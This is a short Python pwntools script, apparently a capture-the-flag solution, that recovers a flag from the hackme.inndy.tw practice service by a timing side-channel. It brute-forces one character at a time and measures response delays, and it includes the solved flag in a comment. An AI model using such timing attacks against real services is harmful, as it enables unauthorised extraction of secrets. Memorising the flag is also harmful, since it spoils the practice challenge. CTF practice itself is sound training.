import time
from pwn import *
import numpy
#context.log_level = "debug"

#flag = 'FLAG{2_SLOW_I_M_GOING_TO_SL33P}'
flag = 'FLAG{'
max_time = len(flag)+1
num = len(flag)+1
string = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+_'

view = numpy.zeros((50,128))
s = ''
temp = ''
while True:
	for x in string:

		if view[num][ord(x)] == 1:
			continue
		view[num][ord(x)] = 1

		io = remote('hackme.inndy.tw',7708)
		io.recvuntil('What is your flag?')
		a = time.time()
		io.sendline(flag+x+'}')
		s = io.recvline()
		#print temp == s
		if temp == '':
			temp = s
		io.close()
		b = time.time()
		print "num = {},now_time = {}, now_char = {}, recv = {},max_time = {}".format(num,math.floor(b-a),x,s,max_time)

		if math.floor(b-a) > max_time:
			flag += x
			num += 1
			max_time += 1
			print flag
			break

		elif math.floor(b-a) < max_time:
			flag = flag[:-1]
			num -=1
			max_time -=1
			print 'wrong,now back!'

	if s != temp:
		print flag


